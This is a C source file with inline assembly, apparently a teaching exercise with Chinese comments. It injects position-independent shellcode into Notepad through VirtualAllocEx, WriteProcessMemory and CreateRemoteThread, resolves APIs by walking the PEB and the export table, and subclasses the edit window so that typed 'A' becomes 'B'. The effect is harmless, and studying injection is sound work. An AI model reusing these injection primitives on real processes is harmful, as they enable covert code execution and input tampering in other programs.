#include <windows.h>
#include <stdio.h>
#pragma comment(lib,"user32.lib")
PBYTE pRemoteCode, pCode, pOrignCode;
DWORD dwSizeOfCode,off;
HWND        hMainWnd, hWnd;
 DWORD       pid;

 void _addr_hwnd();
 void _newproc();
 void _addr_cwp();
 void _addr_oldSet();
//(1)被注入代码可以调用下面的代码得到kernel32.dll在远程进程中的基地址
// ---------------------------------------------------------
// type : DWORD GetBaseKernel32()
__declspec(naked) void code_start()
{
    __asm 
    {
    pushad
        push    ebp
        mov     ebp, esp
        sub     esp, 0x28
//hmodkern32 = _GetBaseKernel32();
        call    _GetBaseKernel32
        mov     [ebp - 0x04], eax // save Base Address of "Kernel32.dll"
//dwAddrOfGetProcAddress = _GetGetProcAddrBase(hmodkern32);
        push    eax
        call    _GetGetProcAddrBase
        mov     [ebp - 0x08], eax  // save GetProcAddress
        add     esp, 0x04  
        call    _delta
_delta:
        pop     ebx                         // save registers context from stack
        sub     ebx, offset _delta

// dwAddrOfLoadLibraryA = GetProcAddress(hmodkern32, "LoadLibraryA")
        lea     ecx, [ebx + _str_lla]
        push    ecx
        push    [ebp - 0x04]
        call    dword ptr [ebp - 0x08]
        mov     [ebp - 0x0C], eax

// hmoduser32 = LoadLibraryA("user32.dll");
        lea     ecx, [ebx + _str_u32]
        push    ecx
        call    dword ptr [ebp - 0x0C]
        mov     [ebp-0x10], eax

// dwAddrOfMessageBoxA = GetProcAddress(hmoduser32, "SetWindowLongA");
        lea     ecx, [ebx + _str_swla]
        push    ecx
        push    dword ptr [ebp-0x10]
        call    dword ptr [ebp-0x08]
        mov     [ebp-0x14], eax

        
        
    // DWORD __stdcall SetWindowLongA(HWND hWnd, int nIndex, LONG dwNewLong)
        lea    ecx,[ebx+_newproc]       
        push    ecx
        push    -4
         mov     ecx,[ebx+_addr_hwnd]
        push    ecx
        call    dword ptr [ebp-0x14] 
		mov [ebx+_addr_oldSet], eax  //地址
  // dwAddrOfMessageBoxA = GetProcAddress(hmoduser32, "CallWindowProc");      
        lea     ecx, [ebx + _str_cwp]
        push    ecx
        push    dword ptr [ebp-0x10]
        call    dword ptr [ebp-0x08]
        mov     [ebx+_addr_cwp], eax
        
        mov     esp, ebp
        pop     ebp
        popad

        retn                           // >> jump to the Original AOEP
// ---------------------------------------------------------

// type : DWORD GetBaseKernel32()
_GetBaseKernel32:
        push    ebp
        mov     ebp, esp
        push    esi
        push    edi
        xor     ecx, ecx                    // ECX = 0
        mov     esi, fs:[0x30]              // ESI = &(PEB) ([FS:0x30])
        mov     esi, [esi + 0x0c]           // ESI = PEB->Ldr
        mov     esi, [esi + 0x1c]           // ESI = PEB->Ldr.InInitOrder
_next_module:
        mov     eax, [esi + 0x08]           // EBP = InInitOrder[X].base_address
        mov     edi, [esi + 0x20]           // EBP = InInitOrder[X].module_name (unicode)
        mov     esi, [esi]                  // ESI = InInitOrder[X].flink (next module)
        cmp     [edi + 12*2], cx            // modulename[12] == 0 ?
        jne     _next_module                 // No: try next module.
        pop     edi
        pop     esi
        mov     esp, ebp
        pop     ebp
        ret
// ---------------------------------------------------------
// type : DWORD GetGetProcAddrBase(DWORD base)
_GetGetProcAddrBase:
        push    ebp
        mov     ebp, esp
        push    edx
        push    ebx
        push    edi
        push    esi

        mov     ebx, [ebp+8]
        mov     eax, [ebx + 0x3c] // edi = BaseAddr, eax = pNtHeader
        mov     edx, [ebx + eax + 0x78]
        add     edx, ebx          // edx = Export Table (RVA)
        mov     ecx, [edx + 0x18] // ecx = NumberOfNames
        mov     edi, [edx + 0x20] //
        add     edi, ebx          // ebx = AddressOfNames

_search:
        dec     ecx
        mov     esi, [edi + ecx*4]
        add     esi, ebx
        mov     eax, 0x50746547 // "PteG"
        cmp     [esi], eax
        jne     _search
        mov     eax, 0x41636f72 //"Acor"
        cmp     [esi+4], eax
        jne     _search

        mov     edi, [edx + 0x24] //
        add     edi, ebx      // edi = AddressOfNameOrdinals
        mov     cx, word ptr [edi + ecx*2]  // ecx = GetProcAddress-orinal
        mov     edi, [edx + 0x1c] //
        add     edi, ebx      // edi = AddressOfFunction
        mov     eax, [edi + ecx*4]
        add     eax, ebx      // eax = GetProcAddress
        
        pop     esi
        pop     edi
        pop     ebx
        pop     edx
        
        mov     esp, ebp
        pop     ebp
        ret
_str_lla:
        _emit   'L'
        _emit   'o'
        _emit   'a'
        _emit   'd'
        _emit   'L'
        _emit   'i'
        _emit   'b'
        _emit   'r'
        _emit   'a'
        _emit   'r'
        _emit   'y'
        _emit   'A'
        _emit   0x0
_str_u32:
        _emit   'u'
        _emit   's'
        _emit   'e'
        _emit   'r'
        _emit   '3'
        _emit   '2'
        _emit   '.'
        _emit   'd'
        _emit   'l'
        _emit   'l'
        _emit   0x0
_str_swla:
        _emit   'S'
        _emit   'e'
        _emit   't'
        _emit   'W'
        _emit   'i'
        _emit   'n'
        _emit   'd'
        _emit   'o'
        _emit   'w'
        _emit   'L'
        _emit   'o'
        _emit   'n'
        _emit   'g'
        _emit   'A'
        _emit   0x0 
_str_gmha:
        _emit   'G'
        _emit   'e'
        _emit   't'
        _emit   'M'
        _emit   'o'
        _emit   'd'
        _emit   'u'
        _emit   'l'
        _emit   'e'
        _emit   'H'
        _emit   'a'
        _emit   'n'
        _emit   'd'
        _emit   'l'
        _emit   'e'
        _emit   'A'
        _emit   0x0 
_str_gw:
        _emit   'G'
        _emit   'W'
        _emit   'L'
        _emit   '_'
        _emit   'W'
        _emit   'N'
        _emit   'D'
        _emit   'P'
        _emit   'R'
        _emit   'O'
        _emit   'C'
        _emit   0x0
_str_cwp:
        _emit   'C'
        _emit   'a'
        _emit   'l'
        _emit   'l'
        _emit   'W'
        _emit   'i'
        _emit   'n'
        _emit   'd'
        _emit   'o'
        _emit   'w'
        _emit   'P'
        _emit   'r'
        _emit   'o'
        _emit   'c'
        _emit   'A'
        _emit   0x0
  }
}


__declspec(naked) void _addr_hwnd()
{
    __asm {
        _emit   0xaa
        _emit   0xbb
        _emit   0xbb
        _emit   0xdd
    }
}

__declspec(naked) void _addr_oldSet()
{
    __asm {
        _emit   0xaa
        _emit   0xbb
        _emit   0xbb
        _emit   0xdd
    }
}

__declspec(naked) void _addr_cwp()
{
    __asm {
        _emit   0xaa
        _emit   0xbb
        _emit   0xbb
        _emit   0xdd
    }
}

__declspec(naked) void _newproc()
{
  __asm{
        push    ebp
        mov     ebp,esp
        push    ebx
        push    esi
        push    edi
        call    _delta2
_delta2:
        pop     ebx
        sub     ebx,    offset _delta2
        mov     ecx,    dword ptr [ebp + 0x0C]  // ecx <- uMsg
        mov     edx,    dword ptr [ebp + 0x10]  // edx <- wParam
        mov     edi,    dword ptr [ebp + 0x14]  // edi <- lParam
_cont0:
        cmp     ecx,    WM_CHAR
        jne     _contn
        cmp     edx,    'A'
        jne     _contn
        mov     edx,    'B'
_contn:
        push    edi
        push    edx
        push    ecx
        push    dword ptr[ebx+_addr_hwnd]
       // 在这里填入代码，调用旧的消息处理函数
        push    dword ptr[ebx+_addr_oldSet]
        call    dword ptr[ebx+_addr_cwp]
_ret2:
        pop     edi
        pop     esi
        pop     ebx
        mov     esp, ebp
        pop     ebp
        ret     0x10
}
}

__declspec(naked) void code_end()
{
    __asm _emit 0xCC
}


DWORD make_code()   // make_code()函数是将开始标记和结束标记之间的所有二进制数据拷贝到一个缓冲区中
{
    DWORD func_addr;
    HMODULE hModule;
    __asm {
        mov edx, offset code_start
        mov dword ptr [pOrignCode], edx
        mov eax, offset code_end
        sub eax, edx
        mov dword ptr [dwSizeOfCode], eax
    }
    pCode = VirtualAlloc(NULL, dwSizeOfCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  //返回首地址
    if (pCode== NULL) {
        printf("[E]: VirtualAlloc failed\n");
        return 0;
    }
    printf("[I]: VirtualAlloc ok --> at 0x%08x.\n", pCode);
    for (off = 0; off<dwSizeOfCode; off++) {
        *(pCode+off) = *(pOrignCode+off);
    }
    printf("[I]: Copy code ok --> from 0x%08x to 0x%08x with size of 0x%08x.\n", 
        pOrignCode, pCode, dwSizeOfCode);
    off = (DWORD)pCode - (DWORD)pOrignCode;
    //*(PDWORD)((PBYTE)_addr_GetModuleHandleA + off) = func_addr;
    //*(PDWORD)((PBYTE)_addr_orign_aoep + off) = pOptHeader->AddressOfEntryPoint;//+pOptHeader->ImageBase
    *(PDWORD)((PBYTE)_addr_hwnd + off) = hWnd;//
    return dwSizeOfCode;
}
int inject_code(DWORD PID)
{
    //请填入代码，完成注入过程
    HANDLE  hProcess    = 0; 
    PBYTE   pCodeRemote = NULL;
    DWORD   dwNumBytesXferred = 0;
    
    HANDLE  hThread	   = 0;
    DWORD   dwThreadId = 0;
    int   exitcode   = 0;

    printf("[I]: Opening remote process %d......", PID); 
    hProcess = OpenProcess(PROCESS_CREATE_THREAD 
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION 
        | PROCESS_VM_WRITE 
        | PROCESS_VM_READ,
        FALSE, PID);
        
    if (hProcess == NULL) {
        printf("failed.\n"); 
        return -1;
    }   
    printf("ok.\n");

    printf("[I]: Allocating remote memory with size of 0x%08x ......", 
        dwSizeOfCode);

    pCodeRemote = (PBYTE) VirtualAllocEx(hProcess, 
            0, 
            dwSizeOfCode, 
            MEM_COMMIT, 
            PAGE_EXECUTE_READWRITE);
    if (pCodeRemote == NULL) {
        printf("failed.\n");
        CloseHandle(hProcess);
        return -1;
    }
    printf("ok at 0x%08x.\n", pCodeRemote);

    printf("[I]: Writing code ......");
    if (WriteProcessMemory(hProcess, 
            pCodeRemote, 
            pCode, 
            dwSizeOfCode, 
            &dwNumBytesXferred) == 0) {
        printf("failed.\n");
        VirtualFreeEx(hProcess, pCodeRemote,
                dwSizeOfCode, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    };
    printf("ok (%d bytes were written).\n", dwNumBytesXferred);
        
    printf("[I]: Creating a remote thread ......");
    hThread = CreateRemoteThread(hProcess, NULL, 0, 
            (LPTHREAD_START_ROUTINE) pCodeRemote,
            pCodeRemote, 0 , &dwThreadId);
    if (hThread == 0) {
        printf("failed.\n");
        if ( pCodeRemote != 0 )	
            VirtualFreeEx(hProcess, pCodeRemote, 0, MEM_RELEASE);
        if ( hThread != 0 )			
            CloseHandle(hThread);
        return -1;
    }
    printf("ok.\n");
 
    printf("[I]: Waiting the remote thread ......");
    //WaitForSingleObject(hThread, INFINITE);
    WaitForSingleObject(hThread, 0xffffffff);
    GetExitCodeThread(hThread, (PDWORD) &exitcode);
    printf("exited with 0x%08X\n", exitcode);
 
    //VirtualFreeEx(hProcess, pCodeRemote, 0, MEM_RELEASE);
    //CloseHandle(hProcess);

    return 0;
}

int main(int argc, char *argv[])
{
    
    hMainWnd = FindWindow("notepad", NULL);
    hWnd = GetWindow(hMainWnd, GW_CHILD);
    printf("hWnd:%08x\n",hWnd);
    GetWindowThreadProcessId(hWnd, &pid);

    // 为pid赋值为hello.exe的进程ID
    make_code();
    inject_code(pid);
    return 0;
    }